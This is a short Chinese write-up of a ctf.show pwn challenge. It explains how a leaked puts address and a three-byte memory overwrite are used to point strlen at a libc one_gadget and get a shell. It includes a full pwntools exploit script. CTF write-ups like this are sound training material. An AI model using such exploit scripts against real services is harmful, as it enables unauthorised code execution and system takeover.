# 挑战简介 
学累了吧，来玩个游戏

# 思路
首先题目直接给了puts函数的地址，并且首先读入我们的输入并转化为int64整数

之后在循环函数中读取三个字符，存于bullets数组，然后修改指定内存的低3个字节  

因此我们可以控制v6的值

<img width="712" height="107" alt="image" src="https://github.com/user-attachments/assets/96d9bd45-89e6-428e-99a4-c86b5ece326e" />

不允许数组的前两个元素同时为 0xc5 和 0xf2 ，或者 0x22 和 0xf3 ，或者 0x8c 和 0xa3  

简单来说就是限制了gadget  

之后通过获取libc版本，获得基址之后，修改strlen函数并再次调用，来实现one_gadget的跳转并且shell的利用    
```
from pwn import *
from LibcSearcher import *
context(arch = "amd64",os = 'linux',log_level = 'debug')

#context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28195)

elf = ELF('D:\edge 下载\pwn')

io.recvuntil(b'0x')

put_addr = int(io.recv(12),16)

libc = LibcSearcher('puts', put_addr)

libc_base = put_addr - libc.dump('puts')

strlen = libc_base + 0x3eb0a8

s = str(strlen)

io.sendline(s)

one_gadget = libc_base + 0xe54fe

for _ in range(3):
    io.sendlineafter("biang!\n", chr(one_gadget & 0xff))
    one_gadget >>= 8

io.interactive()
```
